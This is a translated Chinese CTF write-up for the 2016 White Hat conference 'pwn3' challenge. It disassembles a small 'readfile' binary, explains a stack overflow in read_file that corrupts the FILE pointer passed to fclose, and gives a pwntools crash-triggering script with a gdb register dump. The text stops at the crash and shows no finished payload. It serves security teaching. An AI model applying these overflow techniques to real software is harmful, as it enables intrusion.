# 【CTF通关攻略】白帽大会-pwn3-挑战指南
|
##### 译文声明
本文是翻译文章，文章来源：安全客
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
2016年白帽大会结束了，让我们来看一看会中提出的pwn3挑战。
**  
**
**挑战**
* * *
二进制文件本身是很简单的，因为其中只有两个函数︰ write_file 和 read_file，而Write_file 函数又非常简单直接。
    $ r2 readfile
    [0x08048640]> aaa
    [0x08048640]> s sym.write_file 
    [0x080486f4]> pdf~call
    |           0x08048708      e833feffff     call sym.imp.printf
    |           0x08048715      e816ffffff     call sym.imp.__fpurge
    |           0x08048721      e82afeffff     call sym.imp.gets
    |           0x08048737      e8d4feffff     call sym.imp.fopen
    |       |   0x0804874c      e85ffeffff     call sym.imp.puts
    |       |   0x08048758      e873feffff     call sym.imp.exit
    |           0x08048765      e8d6fdffff     call sym.imp.printf
    |           0x08048779      e8a2feffff     call sym.imp.__isoc99_scanf
    |           0x080487c5      e876fdffff     call sym.imp.printf
    |           0x080487d2      e859feffff     call sym.imp.__fpurge
    |           0x080487ef      e86cfdffff     call sym.imp.fgets
    |           0x0804880f      e87cfdffff     call sym.imp.fwrite
    |           0x0804881a      e851fdffff     call sym.imp.fclose
简单地说，write_file 将执行以下操作︰
要求用户提供文件名
如果给定文件名打不开，那直接退出；
要求用户提供写入文件的大小；
要求用户提供写入文件的数据；
将给定数据写入指定文件名；
退出。
这部分没有什么特别之处。我们可以直接将我们的文件内容写入磁盘。
有趣的部分是read_file。这部分代码的开始部分和 write_file 很类似。
要求用户提供文件名；
如果打不开给定文件名，就退出。
假设给定文件名是有效的，那么会直接执行接下来的代码。
    |       `-> 0x0804888e      c74424080200.  mov dword [esp + 8], 2
    |           0x08048896      c74424040000.  mov dword [esp + 4], 0
    |           0x0804889e      8b45f4         mov eax, dword [ebp - local_ch]
    |           0x080488a1      890424         mov dword [esp], eax
    |           0x080488a4      e8d7fcffff     call sym.imp.fseek
    |           0x080488a9      8b45f4         mov eax, dword [ebp - local_ch]
    |           0x080488ac      890424         mov dword [esp], eax
    |           0x080488af      e83cfdffff     call sym.imp.ftell
    |           0x080488b4      8945f0         mov dword [ebp - local_10h], eax
    |           0x080488b7      c74424080000.  mov dword [esp + 8], 0
    |           0x080488bf      c74424040000.  mov dword [esp + 4], 0
    |           0x080488c7      8b45f4         mov eax, dword [ebp - local_ch]
    |           0x080488ca      890424         mov dword [esp], eax
    |           0x080488cd      e8aefcffff     call sym.imp.fseek
    |           0x080488d2      8b55f0         mov edx, dword [ebp - local_10h]
    |           0x080488d5      8d85f0feffff   lea eax, [ebp - local_110h]
    |           0x080488db      8b4df4         mov ecx, dword [ebp - local_ch]
    |           0x080488de      894c240c       mov dword [esp + 0xc], ecx
    |           0x080488e2      89542408       mov dword [esp + 8], edx
    |           0x080488e6      c74424040100.  mov dword [esp + 4], 1
    |           0x080488ee      890424         mov dword [esp], eax
    |           0x080488f1      e8aafcffff     call sym.imp.fread
    |           0x080488f6      8d85f0feffff   lea eax, [ebp - local_110h]
    |           0x080488fc      890424         mov dword [esp], eax
    |           0x080488ff      e8acfcffff     call sym.imp.puts
    |           0x08048904      8b45f4         mov eax, dword [ebp - local_ch]
    |           0x08048907      890424         mov dword [esp], eax
    |           0x0804890a      e861fcffff     call sym.imp.fclose
    |           0x0804890f      c9             leave
               0x08048910      c3             ret
此函数会在fread时发生多汁，无论给定的写入内容是什么，Fread 都会将其写入 local_110h，这就给了我们一个缓冲区溢出漏洞。
在此溢出中， local_ch 变量将会被覆盖，该变量中会包含打开文件的文件标头。在溢出之后会出现这个问题，然后此指针会被传递给
fclose。如果该指针不指向一个有效的文件结构，会出现一个神奇的错误，在这种情况下这样的错误对用户来说很不利。
我们从下面的脚本开始。此脚本只是创建了函数，使得调用该二进制文件函数变得更容易一点。我们将文件名设置称大写字符循环值，将文件内容设置成另一种循环的小写字符；所以如果我们在之后的崩溃中看到这些循环值，就可以知道数据
(在 Github win_1.py) 的出处了。
    from pwn import *
    import string
    context.terminal = ['tmux', 'splitw', '-h']
    r = None
    def write_file(name, data):
        r.sendline('1')
        r.sendline(name)
        r.sendline(str(len(data)))
        r.sendline(data)
    def read_file(name):
        r.sendline('2')
        r.sendline(name)
    filename = '/tmp/' + cyclic(240, alphabet=string.ascii_uppercase)
    print(filename)
    try:
        os.remove(filename)
    except:
        pass
    r = process("./readfile")
    write_file(filename, cyclic(1000))
    r = process("./readfile")
    gdb.attach(r, '''
    c
    ''')
    read_file(filename)
    r.interactive()
执行这个代码之后，我们会看到下面这样的问题。
    [----------------------REGISTERS-----------------------]
    *EAX  0x63616170 ('paac')
    *EBX  0xf771b000  0xf771bac0 (_IO_2_1_stdout_)  0xf75d4386     cmp    byte ptr [esi + 0x46], 0
        0xf75d438a     jne    0xf75d4510          
    [------------------------STACK-------------------------]
    00:0000| esp  0xffe59e50 --> 0xf771bac0 (_IO_2_1_stdout_)  0xf771b000  0xffe59fa8  0xf7747500  0xf771c898  0xf771b000   f 0 f75d4386 fclose+22
       f 1  804890f read_file+231
       f 2 63616174
       f 3 63616175
       f 4 63616176